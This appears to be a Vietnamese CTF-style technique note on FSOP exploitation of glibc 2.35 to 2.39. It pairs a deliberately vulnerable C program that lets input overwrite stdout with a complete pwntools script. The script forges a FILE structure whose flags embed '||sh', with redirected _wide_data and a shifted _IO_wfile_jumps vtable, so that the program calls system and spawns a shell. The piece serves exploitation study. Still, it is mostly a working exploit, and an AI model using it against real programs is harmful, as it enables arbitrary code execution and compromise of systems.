Lấy cảm hứng từ [this](https://aneii11.github.io/p/fsop-code-execution/#to-do)
Test thành công trên `glibc 2.35`, `2.38`, `2.39` (same code path).

# Scenery

Có khả năng overwrite lên `stdout` trong libc.
Có khả năng ghi đè ít nhất `0xE8 bytes`. (nếu là `0xE0` cân nhắc `fsop an3eii`).

# POC

## Demo code C

Compile theo shogun

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);

    printf("libc leak: %p\n", stdout);
    read(0, stdout, 0xE8);
    puts("trigger");

    return 0;
}
```

## Demo exploit

Compile trên local (`wsl2 ubuntu 22.04.5 LTS`) với `glibc 2.39`:

```
from pwn import *

exe = ELF("./tmp")
libc = ELF("/home/vani/glibc-2.39/compiled-2.39/lib/libc.so.6")
context.binary = exe

script = '''
b *main
b *main + 123
b *_IO_wdoallocbuf
'''

p = process("./tmp")
#p = gdb.debug("./tmp", gdbscript = script)

p.recvuntil(b"libc leak: ")
libc_base = int(p.recvline(), 16) - 0x1d07a0
print(hex(libc_base))

_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
system = libc_base + libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)

p.send(payload)

p.interactive()
```

<mark>Với các bản glibc khác chỉ cần thay đổi đoạn tính toán libc base</mark>.

# Idea

Cùng ý tưởng được nếu trong `readme2`. Chỉ là thay đổi `fileptr` sang địa chỉ của `stdout` trong `glibc`, khá dễ hiểu trong trường hợp ta có thể leak libc.